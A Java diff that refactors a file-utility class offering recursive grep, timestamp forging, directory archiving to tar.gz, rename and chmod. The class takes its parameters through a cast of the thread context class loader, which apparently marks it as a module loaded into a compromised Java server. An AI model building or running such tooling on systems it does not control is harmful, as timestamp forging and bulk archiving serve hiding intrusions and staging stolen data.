@@ -29,30 +29,35 @@ public class FileEnhanceComponent implements Runnable {
     private static final int ACTION_RENAME = 4;
     private static final int ACTION_CHMOD  = 5;
 
+    private static final String[] BINARY_EXTENSIONS = {
+        ".class",".jar",".war",".ear",".zip",".tar",".gz",".bz2",".xz",
+        ".7z",".rar",".png",".jpg",".jpeg",".gif",".bmp",".ico",".svg",
+        ".mp3",".mp4",".avi",".mov",".mkv",".pdf",".doc",".docx",".xls",
+        ".xlsx",".ppt",".pptx",".exe",".dll",".so",".dylib",".bin",
+        ".dat",".db",".sqlite",".lock",".pid"
+    };
+
     private HashMap<String, Object> params;
     private HashMap<String, Object> results;
     private String packSourceCanonical;
     private String packDestinationCanonical;
-    private HashSet packVisitedDirectories;
+    private HashSet<String> packVisitedDirectories;
 
     @Override
-
     public void run() {
         java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
         try {
-            params = (java.util.HashMap) h.invoke(null, null, null);
-            results = new java.util.HashMap();
+            params = (HashMap) h.invoke(null, null, null);
+            results = new HashMap();
             invoke();
         } catch (Throwable t) {
-            if (results == null) results = new java.util.HashMap();
-            results.put("code", Integer.valueOf(500));
-            results.put("msg", t.getMessage());
+            if (results == null) results = new HashMap();
+            setResult(500, t.getMessage());
         }
         if (results != null) {
             try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
         }
     }
-
 
     public void invoke() throws Exception {
         int action = getInt("action", -1);
@@ -63,8 +68,7 @@ public class FileEnhanceComponent implements Runnable {
             case ACTION_RENAME: doRename(); break;
             case ACTION_CHMOD:  doChmod();  break;
             default:
-                results.put("code", 400);
-                results.put("msg", "未知 action: " + action);
+                setResult(400, "未知 action: " + action);
         }
     }
 
@@ -79,12 +83,8 @@ public class FileEnhanceComponent implements Runnable {
         int maxLineLen   = getInt("maxLineLen", 300);
         String include   = getString("include"); // 文件名 glob，如 "*.java"
 
-        if (rootPath == null || rootPath.isEmpty()) {
-            results.put("code", 400); results.put("msg", "path 不能为空"); return;
-        }
-        if (keyword == null || keyword.isEmpty()) {
-            results.put("code", 400); results.put("msg", "keyword 不能为空"); return;
-        }
+        if (!requireValue(rootPath, "path")) return;
+        if (!requireValue(keyword, "keyword")) return;
         if (maxResults < 1) maxResults = 1;
         if (maxResults > 10000) maxResults = 10000;
         if (maxLineLen < 1) maxLineLen = 1;
@@ -92,7 +92,7 @@ public class FileEnhanceComponent implements Runnable {
 
         File root = new File(rootPath);
         if (!root.exists()) {
-            results.put("code", 404); results.put("msg", "路径不存在: " + rootPath); return;
+            setResult(404, "路径不存在: " + rootPath); return;
         }
 
         Pattern pattern;
@@ -102,7 +102,7 @@ public class FileEnhanceComponent implements Runnable {
                 ? Pattern.compile(patternStr, Pattern.CASE_INSENSITIVE)
                 : Pattern.compile(patternStr);
         } catch (Exception e) {
-            results.put("code", 400); results.put("msg", "正则表达式无效: " + e.getMessage()); return;
+            setResult(400, "正则表达式无效: " + e.getMessage()); return;
         }
 
         List matches = new ArrayList();
@@ -110,7 +110,7 @@ public class FileEnhanceComponent implements Runnable {
         int[] scannedFiles = new int[] {0};
         int[] remaining = new int[] {maxResults};
 
-        grepRecursive(root, include, pattern, maxLineLen, matches, totalFiles, scannedFiles, remaining, 0);
+        grepRecursive(root, compileGlob(include), pattern, maxLineLen, matches, totalFiles, scannedFiles, remaining, 0);
 
         results.put("code", 200);
         results.put("matches", matches);
@@ -120,7 +120,7 @@ public class FileEnhanceComponent implements Runnable {
         results.put("truncated", remaining[0] <= 0);
     }
 
-    private void grepRecursive(File file, String include, Pattern pattern, int maxLineLen,
+    private void grepRecursive(File file, Pattern include, Pattern pattern, int maxLineLen,
                                List matches, int[] totalFiles, int[] scannedFiles,
                                int[] remaining, int depth) {
         if (file == null || remaining[0] <= 0 || depth > 256) {
@@ -140,7 +140,7 @@ public class FileEnhanceComponent implements Runnable {
         }
 
         totalFiles[0]++;
-        if (include != null && include.length() > 0 && !matchesGlob(file.getName(), include)) {
+        if (include != null && !include.matcher(file.getName()).matches()) {
             return;
         }
 
@@ -188,9 +188,9 @@ public class FileEnhanceComponent implements Runnable {
         }
     }
 
-    private boolean matchesGlob(String name, String glob) {
+    private Pattern compileGlob(String glob) {
         if (glob == null || glob.length() == 0 || "*".equals(glob)) {
-            return true;
+            return null;
         }
         StringBuffer regex = new StringBuffer();
         for (int i = 0; i < glob.length(); i++) {
@@ -206,19 +206,12 @@ public class FileEnhanceComponent implements Runnable {
                 regex.append(ch);
             }
         }
-        return Pattern.matches(regex.toString(), name);
+        return Pattern.compile(regex.toString());
     }
 
     private boolean isBinaryExtension(String name) {
-        String[] binExts = {
-            ".class",".jar",".war",".ear",".zip",".tar",".gz",".bz2",".xz",
-            ".7z",".rar",".png",".jpg",".jpeg",".gif",".bmp",".ico",".svg",
-            ".mp3",".mp4",".avi",".mov",".mkv",".pdf",".doc",".docx",".xls",
-            ".xlsx",".ppt",".pptx",".exe",".dll",".so",".dylib",".bin",
-            ".dat",".db",".sqlite",".lock",".pid"
-        };
-        for (int i = 0; i < binExts.length; i++) {
-            if (name.endsWith(binExts[i])) return true;
+        for (String extension : BINARY_EXTENSIONS) {
+            if (name.endsWith(extension)) return true;
         }
         return false;
     }
@@ -230,13 +223,11 @@ public class FileEnhanceComponent implements Runnable {
         String timeStr   = getString("time");   // yyyy-MM-dd HH:mm:ss 或 null（使用当前时间）
         boolean recursive = Boolean.TRUE.equals(params.get("recursive"));
 
-        if (path == null || path.isEmpty()) {
-            results.put("code", 400); results.put("msg", "path 不能为空"); return;
-        }
+        if (!requireValue(path, "path")) return;
 
         File target = new File(path);
         if (!target.exists()) {
-            results.put("code", 404); results.put("msg", "路径不存在: " + path); return;
+            setResult(404, "路径不存在: " + path); return;
         }
 
         long timestamp;
@@ -245,8 +236,7 @@ public class FileEnhanceComponent implements Runnable {
                 SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                 timestamp = sdf.parse(timeStr).getTime();
             } catch (Exception e) {
-                results.put("code", 400);
-                results.put("msg", "时间格式错误，请使用 yyyy-MM-dd HH:mm:ss");
+                setResult(400, "时间格式错误，请使用 yyyy-MM-dd HH:mm:ss");
                 return;
             }
         } else {
@@ -261,13 +251,11 @@ public class FileEnhanceComponent implements Runnable {
             count = target.setLastModified(timestamp) ? 1 : 0;
         }
         if (count == 0) {
-            results.put("code", 500);
-            results.put("msg", "时间戳修改失败");
+            setResult(500, "时间戳修改失败");
             return;
         }
 
-        results.put("code", 200);
-        results.put("msg", "时间戳修改成功");
+        setResult(200, "时间戳修改成功");
         results.put("modifiedCount", Integer.valueOf(count));
         results.put("newTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timestamp)));
     }
@@ -294,13 +282,11 @@ public class FileEnhanceComponent implements Runnable {
         String sourcePath = getString("path");
         String destPath   = getString("destPath"); // 可选，不传则用系统临时目录
 
-        if (sourcePath == null || sourcePath.isEmpty()) {
-            results.put("code", 400); results.put("msg", "path 不能为空"); return;
-        }
+        if (!requireValue(sourcePath, "path")) return;
 
         File source = new File(sourcePath);
         if (!source.exists()) {
-            results.put("code", 404); results.put("msg", "路径不存在: " + sourcePath); return;
+            setResult(404, "路径不存在: " + sourcePath); return;
         }
         source = source.getCanonicalFile();
 
@@ -321,7 +307,7 @@ public class FileEnhanceComponent implements Runnable {
         }
         packSourceCanonical = source.getCanonicalPath();
         packDestinationCanonical = destFile.getCanonicalPath();
-        packVisitedDirectories = new HashSet();
+        packVisitedDirectories = new HashSet<String>();
 
         // 写 tar.gz（纯 Java 实现，不依赖外部命令）
         FileOutputStream fos = null;
@@ -342,8 +328,7 @@ public class FileEnhanceComponent implements Runnable {
             if (!packed) destFile.delete();
         }
 
-        results.put("code", 200);
-        results.put("msg", "打包成功");
+        setResult(200, "打包成功");
         results.put("archivePath", destFile.getAbsolutePath());
         results.put("archiveName", archiveName);
         results.put("archiveSize", destFile.length());
@@ -363,16 +348,13 @@ public class FileEnhanceComponent implements Runnable {
             return;
         }
         if (file.isDirectory()) {
-            if (packVisitedDirectories.contains(canonical)) {
-                return;
-            }
-            packVisitedDirectories.add(canonical);
+            if (!packVisitedDirectories.add(canonical)) return;
             writeTarEntry(file, baseDir, out);
             File[] children = file.listFiles();
             if (children != null) {
                 Arrays.sort(children);
-                for (int i = 0; i < children.length; i++) {
-                    writeTar(children[i], baseDir, out);
+                for (File child : children) {
+                    writeTar(child, baseDir, out);
                 }
             }
         } else {
@@ -411,7 +393,6 @@ public class FileEnhanceComponent implements Runnable {
 
     private byte[] buildTarHeader(String name, File file) throws Exception {
         byte[] header = new byte[512];
-        Arrays.fill(header, (byte) 0);
 
         writeTarName(header, name);
 
@@ -482,33 +463,28 @@ public class FileEnhanceComponent implements Runnable {
         String path    = getString("path");
         String newName = getString("newName");
 
-        if (path == null || path.isEmpty()) {
-            results.put("code", 400); results.put("msg", "path 不能为空"); return;
-        }
-        if (newName == null || newName.isEmpty()) {
-            results.put("code", 400); results.put("msg", "newName 不能为空"); return;
-        }
+        if (!requireValue(path, "path")) return;
+        if (!requireValue(newName, "newName")) return;
         if (newName.contains("/") || newName.contains("\\") || newName.equals(".") || newName.equals("..")) {
-            results.put("code", 400); results.put("msg", "newName 包含非法字符"); return;
+            setResult(400, "newName 包含非法字符"); return;
         }
 
         File src = new File(path);
         if (!src.exists()) {
-            results.put("code", 404); results.put("msg", "文件不存在: " + path); return;
+            setResult(404, "文件不存在: " + path); return;
         }
 
         File dest = new File(src.getParentFile(), newName);
         if (dest.exists()) {
-            results.put("code", 409); results.put("msg", "目标名称已存在: " + newName); return;
+            setResult(409, "目标名称已存在: " + newName); return;
         }
 
         boolean ok = src.renameTo(dest);
         if (!ok) {
-            results.put("code", 500); results.put("msg", "重命名失败"); return;
+            setResult(500, "重命名失败"); return;
         }
 
-        results.put("code", 200);
-        results.put("msg", "重命名成功");
+        setResult(200, "重命名成功");
         results.put("newPath", dest.getAbsolutePath());
     }
 
@@ -519,23 +495,19 @@ public class FileEnhanceComponent implements Runnable {
         String mode      = getString("mode");     // 如 "755" 或 "0755"
         boolean recursive = Boolean.TRUE.equals(params.get("recursive"));
 
-        if (path == null || path.isEmpty()) {
-            results.put("code", 400); results.put("msg", "path 不能为空"); return;
-        }
-        if (mode == null || mode.isEmpty()) {
-            results.put("code", 400); results.put("msg", "mode 不能为空"); return;
-        }
+        if (!requireValue(path, "path")) return;
+        if (!requireValue(mode, "mode")) return;
         // 只允许 3-4 位八进制数字
         int modeStart = 0;
         while (modeStart < mode.length() - 1 && mode.charAt(modeStart) == '0') modeStart++;
         String modeClean = mode.substring(modeStart);
         if (!modeClean.matches("[0-7]{1,4}")) {
-            results.put("code", 400); results.put("msg", "mode 格式错误，需为八进制数字如 755"); return;
+            setResult(400, "mode 格式错误，需为八进制数字如 755"); return;
         }
 
         File target = new File(path);
         if (!target.exists()) {
-            results.put("code", 404); results.put("msg", "路径不存在: " + path); return;
+            setResult(404, "路径不存在: " + path); return;
         }
 
         // 尝试使用系统 chmod 命令（Linux/macOS）
@@ -571,13 +543,11 @@ public class FileEnhanceComponent implements Runnable {
         }
 
         if (exitCode != 0) {
-            results.put("code", 500);
-            results.put("msg", "权限修改失败" + (errMsg.isEmpty() ? "" : ": " + errMsg));
+            setResult(500, "权限修改失败" + (errMsg.isEmpty() ? "" : ": " + errMsg));
             return;
         }
 
-        results.put("code", 200);
-        results.put("msg", "权限修改成功");
+        setResult(200, "权限修改成功");
         results.put("mode", modeClean);
     }
 
@@ -644,13 +614,19 @@ public class FileEnhanceComponent implements Runnable {
         catch (NumberFormatException e) { return def; }
     }
 
+    private boolean requireValue(String value, String name) {
+        if (value != null && !value.isEmpty()) return true;
+        setResult(400, name + " 不能为空");
+        return false;
+    }
+
+    private void setResult(int code, String message) {
+        results.put("code", Integer.valueOf(code));
+        results.put("msg", message);
+    }
+
     private void closeQuietly(Closeable closeable) {
-        if (closeable == null) {
-            return;
-        }
-        try {
-            closeable.close();
-        } catch (Exception ignored) {
-        }
+        if (closeable == null) return;
+        try { closeable.close(); } catch (Exception ignored) {}
     }
 }
